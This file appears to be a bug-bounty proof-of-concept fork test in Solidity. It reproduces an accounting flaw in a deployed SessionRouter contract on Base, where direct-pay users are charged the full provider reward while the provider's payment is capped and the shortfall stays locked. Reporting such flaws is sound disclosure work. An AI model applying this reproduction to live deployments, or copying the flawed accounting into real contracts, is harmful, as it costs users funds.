// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ============================================================================
// Morpheus Bug Bounty v2 — fork test for candidate E-4
// SessionRouter (Base, through LumerinDiamond): direct-pay user is charged the
// FULL provider reward at close, while the provider's payment is capped by the
// 365-day stake limiter — the truncated difference is retained by the diamond
// and is recoverable by nobody.
//
// Target (Appendix A, Base): LumerinDiamond
//   0x6aBE1d282f72B474E54527D93b979A4f64d3030a
// SessionRouter facet 0x3a3952F0e57B343F00B31F7da039Ef16389B7260 (all calls go
// THROUGH the diamond; loupe routing asserted in setUp).
// Token: MOR on Base 0x7431aDa8a591C955a994a21710752EF9b882b8e3
// Source: MorpheusAIs/Morpheus-Lumerin-Node @ ba14d2f (lib-src/).
//
// Mechanism (SessionRouter.sol @ ba14d2f):
//   - _claimForProvider (L371) caps every provider payment at
//     providerClaimLimit_ = provider.stake - provider.limitPeriodEarned
//     (365-day limiter). The capped amount is what increments
//     session.providerWithdrawnAmount / limitPeriodEarned / providersTotalClaimed.
//   - claimForProvider (L344) lets the provider collect for an UNCLOSED
//     direct-pay session once endsAt passed, out of the diamond balance.
//   - At close, _rewardUserAfterClose (L318) deducts
//     _getProviderRewards(session, bid, includeWithdrawn = false) from the
//     user's refundable stake — the FULL gross reward, uncapped, ignoring
//     providerWithdrawnAmount.
//   => If the limiter binds, provider receives less than the user is charged;
//      (gross - providerReceived) stays in the diamond forever: no function
//      credits it back to the user (it is not added to feeBalance, not to
//      providersTotalClaimed, not refunded).
//
// Live parameters at the pinned block (read 2026-11-12, asserted in tests):
//   providerMinimumStake = 0.2 MOR, modelMinimumStake = 0.1 MOR,
//   bidFee = 0.3 MOR, bid price range [1e10, 1e16] wei/s,
//   maxSessionDuration = 604800 s, getComputeBalance ~= 2,996,976 MOR,
//   totalMORSupply ~= 10,259,184 MOR  =>  stipend for a 10,000 MOR user stake
//   ~= 29.2 MOR >> 0.2 MOR limiter budget of a minimum-stake provider.
//
// Actors: provider (own key, signs approvals/receipts), modelOwner, user —
// all fresh addresses created by this test, no protocol roles, no delegation.
// Funding (setup only): actors' MOR balances are written with vm.store on
// the token's ERC20 balance mapping slot, discovered in setUp by matching
// the diamond's known on-chain balance (same technique as the D-01 PoC).
//
// Run from a clean clone:  forge test -vvv
// ============================================================================

interface Vm {
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function warp(uint256 newTimestamp) external;
    function prank(address msgSender) external;
    function store(address target, bytes32 slot, bytes32 value) external;
    function load(address target, bytes32 slot) external view returns (bytes32);
    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);
    function addr(uint256 privateKey) external pure returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

struct Provider {
    string endpoint;
    uint256 stake;
    uint128 createdAt;
    uint128 limitPeriodEnd;
    uint256 limitPeriodEarned;
    bool isDeleted;
}

struct Session {
    address user;
    bytes32 bidId;
    uint256 stake;
    bytes closeoutReceipt;
    uint256 closeoutType;
    uint256 providerWithdrawnAmount;
    uint128 openedAt;
    uint128 endsAt;
    uint128 closedAt;
    bool isActive;
    bool isDirectPaymentFromUser;
}

struct Bid {
    address provider;
    bytes32 modelId;
    uint256 pricePerSecond;
    uint256 nonce;
    uint128 createdAt;
    uint128 deletedAt;
}

interface IDiamond {
    function facetAddress(bytes4 selector_) external view returns (address);
    function getToken() external view returns (address);
    function getProviderMinimumStake() external view returns (uint256);
    function getModelMinimumStake() external view returns (uint256);
    function getBidFee() external view returns (uint256);
    function getMinMaxBidPricePerSecond() external view returns (uint256, uint256);
    function getMaxSessionDuration() external view returns (uint128);
    function getProvidersTotalClaimed() external view returns (uint256);
    function getComputeBalance(uint128 timestamp_) external view returns (uint256);
    function totalMORSupply(uint128 timestamp_) external view returns (uint256);
    function getProvider(address provider_) external view returns (Provider memory);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function getIsModelActive(bytes32 modelId_) external view returns (bool);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function claimForProvider(bytes32 sessionId_) external;
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function withdrawUserStakes(address user_, uint8 iterations_) external;
}

contract E4SessionRouterTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    string internal constant RPC_URL = "https://mainnet.base.org";
    // Pinned Base block. Live parameters re-read at this block on 2026-11-12
    // (see header) and asserted in the tests.
    uint256 internal constant PINNED_BLOCK = 56437967;

    IDiamond internal constant diamond = IDiamond(0x6aBE1d282f72B474E54527D93b979A4f64d3030a);
    IERC20 internal constant mor = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address internal constant SESSION_ROUTER_FACET = 0x3a3952F0e57B343F00B31f7da039Ef16389B7260;

    uint256 internal constant PPS = 1e14; // 0.0001 MOR/sec, inside live [1e10, 1e16]
    uint256 internal constant USER_STAKE = 10_000 ether; // victim escrow: 10,000 MOR

    uint256 internal constant PROVIDER_PK = 0xB0B5EED;
    address internal provider; // = vm.addr(PROVIDER_PK), set in setUp
    address internal modelOwner = address(0x3003);
    address internal user = address(0x4004);

    uint256 internal morBalanceSlot; // discovered in setUp, not assumed

    event Log(string name, uint256 value);

    // ---- minimal assertion helpers (no forge-std dependency) ----
    function assertEq(uint256 a, uint256 b, string memory what) internal pure {
        if (a != b) revert(string(abi.encodePacked("ASSERT-EQ FAIL: ", what)));
    }

    function assertEq(address a, address b, string memory what) internal pure {
        if (a != b) revert(string(abi.encodePacked("ASSERT-EQ-ADDR FAIL: ", what)));
    }

    function assertGt(uint256 a, uint256 b, string memory what) internal pure {
        if (a <= b) revert(string(abi.encodePacked("ASSERT-GT FAIL: ", what)));
    }

    function assertTrue(bool c, string memory what) internal pure {
        if (!c) revert(string(abi.encodePacked("ASSERT-TRUE FAIL: ", what)));
    }

    // ---- setup ----

    function setUp() public {
        vm.createSelectFork(RPC_URL, PINNED_BLOCK);
        provider = vm.addr(PROVIDER_PK);

        // The diamond must be wired to the in-scope MOR token, and every
        // SessionRouter selector used here must route to the Appendix A facet.
        assertEq(diamond.getToken(), address(mor), "diamond token is not Base MOR");
        assertEq(diamond.facetAddress(IDiamond.openSession.selector), SESSION_ROUTER_FACET, "openSession facet drift");
        assertEq(diamond.facetAddress(IDiamond.closeSession.selector), SESSION_ROUTER_FACET, "closeSession facet drift");
        assertEq(
            diamond.facetAddress(IDiamond.claimForProvider.selector), SESSION_ROUTER_FACET, "claimForProvider facet drift"
        );
        assertEq(
            diamond.facetAddress(IDiamond.withdrawUserStakes.selector),
            SESSION_ROUTER_FACET,
            "withdrawUserStakes facet drift"
        );

        _discoverBalanceSlot();
    }

    /// Finds the ERC20 balance mapping slot of Base MOR by matching the
    /// diamond's live balanceOf against keccak256(abi.encode(holder, slot)).
    function _discoverBalanceSlot() internal {
        uint256 known = mor.balanceOf(address(diamond));
        assertGt(known, 0, "diamond MOR balance is zero at pinned block");
        for (uint256 i = 0; i < 64; i++) {
            bytes32 loc = keccak256(abi.encode(address(diamond), i));
            if (uint256(vm.load(address(mor), loc)) == known) {
                morBalanceSlot = i;
                return;
            }
        }
        revert("MOR balance slot not found in 0..63");
    }

    function _fund(address who, uint256 amount) internal {
        bytes32 loc = keccak256(abi.encode(who, morBalanceSlot));
        vm.store(address(mor), loc, bytes32(amount));
        assertEq(mor.balanceOf(who), amount, "funding via vm.store failed (wrong balance slot?)");
    }

    /// Signs `data` exactly as SessionRouter expects: ECDSA over
    /// toEthSignedMessageHash(keccak256(data)), by the provider key.
    function _providerSign(bytes memory data) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(data)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, digest);
        return abi.encodePacked(r, s, v);
    }

    /// Registers a fresh model + provider (with `providerStake`) and posts a
    /// bid at PPS. Returns the bidId. Provider ends with a zero MOR balance.
    function _setupMarket(uint256 providerStake) internal returns (bytes32 bidId) {
        uint256 modelMin = diamond.getModelMinimumStake();
        uint256 bidFee = diamond.getBidFee();

        _fund(modelOwner, modelMin);
        vm.prank(modelOwner);
        mor.approve(address(diamond), type(uint256).max);
        bytes32 baseModelId = bytes32("e4-model");
        string[] memory tags = new string[](0);
        vm.prank(modelOwner);
        diamond.modelRegister(modelOwner, baseModelId, bytes32("e4cid"), 0, modelMin, "e4-model", tags);
        bytes32 modelId = diamond.getModelId(modelOwner, baseModelId);
        assertTrue(diamond.getIsModelActive(modelId), "model not active after register");

        _fund(provider, providerStake + bidFee);
        vm.prank(provider);
        mor.approve(address(diamond), type(uint256).max);
        vm.prank(provider);
        diamond.providerRegister(provider, providerStake, "e4.provider:1234");
        vm.prank(provider);
        bidId = diamond.postModelBid(provider, modelId, PPS);
        assertEq(mor.balanceOf(provider), 0, "provider should be fully staked-in after setup");
    }

    /// Opens a direct-pay session for `user` staking USER_STAKE on `bidId`.
    function _openSession(bytes32 bidId) internal returns (bytes32 sessionId, Session memory s) {
        _fund(user, USER_STAKE);
        vm.prank(user);
        mor.approve(address(diamond), type(uint256).max);

        bytes memory approval = abi.encode(bidId, block.chainid, user, uint128(block.timestamp));
        bytes memory sig = _providerSign(approval);

        vm.prank(user);
        sessionId = diamond.openSession(user, USER_STAKE, true, approval, sig);
        s = diamond.getSession(sessionId);
        assertTrue(s.isDirectPaymentFromUser, "session is not direct-pay");
        assertEq(s.stake, USER_STAKE, "session stake mismatch");
        assertEq(s.user, user, "session user mismatch");
    }

    /// Closes the session as the user, with a valid provider-signed receipt.
    function _close(bytes32 sessionId) internal {
        bytes memory receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(50));
        bytes memory sig = _providerSign(receipt);
        vm.prank(user);
        diamond.closeSession(receipt, sig);
    }

    function _gross(Session memory s) internal pure returns (uint256) {
        return (uint256(s.endsAt) - uint256(s.openedAt)) * PPS;
    }

    // ========================================================================
    // Branch 1 — E-4 as specified: minimum-stake provider (limiter budget
    // 0.2 MOR) pre-claims after session end; the claim is truncated by the
    // limiter cap; at close the user is still charged the FULL gross reward.
    // ========================================================================
    function test_truncation_preClaim_userShorted() public {
        uint256 minStake = diamond.getProviderMinimumStake();
        assertEq(minStake, 0.2 ether, "live providerMinimumStake drifted from 0.2 MOR");
        assertEq(diamond.getBidFee(), 0.3 ether, "live bidFee drifted from 0.3 MOR");
        assertEq(uint256(diamond.getMaxSessionDuration()), 604800, "live maxSessionDuration drifted");

        bytes32 bidId = _setupMarket(minStake);
        uint256 diamondBalBeforeSession = mor.balanceOf(address(diamond));

        (bytes32 sid, Session memory s) = _openSession(bidId);
        uint256 gross = _gross(s);
        emit Log("branch1 gross (wei)", gross);
        // Truncation precondition, from live state: one session's gross reward
        // exceeds the provider's ENTIRE 365-day limiter budget.
        assertGt(gross, minStake, "gross must exceed the limiter budget, else no truncation");
        assertGt(USER_STAKE, gross, "gross must fit inside the user escrow");

        // Session ends (still unclosed). Provider claims early.
        vm.warp(uint256(s.endsAt) + 1);
        vm.prank(provider);
        diamond.claimForProvider(sid);

        uint256 providerReceived = mor.balanceOf(provider);
        emit Log("branch1 providerReceived pre-claim (wei)", providerReceived);
        assertEq(providerReceived, minStake, "pre-claim must be truncated to the limiter budget (0.2 MOR)");
        Session memory sAfterClaim = diamond.getSession(sid);
        assertEq(sAfterClaim.providerWithdrawnAmount, minStake, "providerWithdrawnAmount tracks the CAPPED amount");
        Provider memory p = diamond.getProvider(provider);
        assertEq(p.limitPeriodEarned, minStake, "limiter budget fully consumed by the truncated claim");

        // Settle late: past startOfDay(endsAt) + 1 days, so the #833 day-lock
        // does not hold any of the refund — balances below are final.
        vm.warp(uint256(s.endsAt) + 2 days + 1);
        _close(sid);

        uint256 refund = mor.balanceOf(user);
        emit Log("branch1 userRefund (wei)", refund);
        assertEq(refund, USER_STAKE - gross, "user refund = stake - FULL gross (uncapped deduction)");
        assertEq(mor.balanceOf(provider), minStake, "close-time provider claim must pay 0 (limiter exhausted)");
        (uint256 avail, uint256 hold) = diamond.getUserStakesOnHold(user, 10);
        assertEq(avail + hold, 0, "no on-hold remainder expected on a late close");

        uint256 retained = mor.balanceOf(address(diamond)) - diamondBalBeforeSession;
        uint256 userLoss = gross - providerReceived;
        emit Log("branch1 retainedByDiamond (wei)", retained);
        emit Log("branch1 userLoss (wei)", userLoss);
        assertGt(userLoss, 0, "user loss must be positive");
        assertEq(retained, userLoss, "the shortfall stays in the diamond: user loss == retained amount");
        // Full accounting for the session window:
        // escrow in (USER_STAKE) = provider (minStake) + refund (USER_STAKE - gross) + retained (gross - minStake)
        assertEq(providerReceived + refund + retained, USER_STAKE, "session accounting does not add up");
    }

    // ========================================================================
    // Branch 2 — Control: provider stake (1,000 MOR) far above the session
    // gross, so the limiter never binds. The algebra must balance EXACTLY:
    // providerReceived + userRefunded == user stake, diamond retains 0.
    // ========================================================================
    function test_control_noTruncation_balancesExactly() public {
        uint256 richStake = 1_000 ether;
        bytes32 bidId = _setupMarket(richStake);
        uint256 diamondBalBeforeSession = mor.balanceOf(address(diamond));

        (bytes32 sid, Session memory s) = _openSession(bidId);
        uint256 gross = _gross(s);
        assertGt(richStake, gross, "control requires limiter budget above gross");

        vm.warp(uint256(s.endsAt) + 1);
        vm.prank(provider);
        diamond.claimForProvider(sid);
        uint256 providerReceived = mor.balanceOf(provider);
        assertEq(providerReceived, gross, "control: pre-claim must pay the full gross (no truncation)");
        Session memory sAfterClaim = diamond.getSession(sid);
        assertEq(sAfterClaim.providerWithdrawnAmount, gross, "control: withdrawn tracks the full gross");

        vm.warp(uint256(s.endsAt) + 2 days + 1);
        _close(sid);

        uint256 refund = mor.balanceOf(user);
        assertEq(refund, USER_STAKE - gross, "control: user refund = stake - gross");
        assertEq(mor.balanceOf(provider), gross, "control: nothing more paid at close");
        uint256 retained = mor.balanceOf(address(diamond)) - diamondBalBeforeSession;
        assertEq(retained, 0, "control: diamond must retain nothing when the limiter does not bind");
        assertEq(providerReceived + refund, USER_STAKE, "control: provider + user == stake (SR-3 holds)");
    }

    // ========================================================================
    // Branch 3 — Counterfactual: same minimum-stake provider, but NO
    // pre-claim at all. The user closes directly. If the shortfall is
    // identical, the root cause is the uncapped user deduction vs the capped
    // provider payment (not the pre-claim ordering itself).
    // ========================================================================
    function test_counterfactual_noPreClaim_sameShortfall() public {
        uint256 minStake = diamond.getProviderMinimumStake();
        bytes32 bidId = _setupMarket(minStake);
        uint256 diamondBalBeforeSession = mor.balanceOf(address(diamond));

        (bytes32 sid, Session memory s) = _openSession(bidId);
        uint256 gross = _gross(s);
        assertGt(gross, minStake, "gross must exceed the limiter budget, else no truncation");

        // No claimForProvider. Straight to a late close.
        vm.warp(uint256(s.endsAt) + 2 days + 1);
        _close(sid);

        uint256 providerReceived = mor.balanceOf(provider);
        uint256 refund = mor.balanceOf(user);
        emit Log("branch3 providerReceived at close (wei)", providerReceived);
        assertEq(providerReceived, minStake, "counterfactual: close-time claim is truncated to the same 0.2 MOR");
        assertEq(refund, USER_STAKE - gross, "counterfactual: user is charged the full gross anyway");
        uint256 retained = mor.balanceOf(address(diamond)) - diamondBalBeforeSession;
        assertEq(retained, gross - minStake, "counterfactual: identical shortfall without any pre-claim");
    }
}
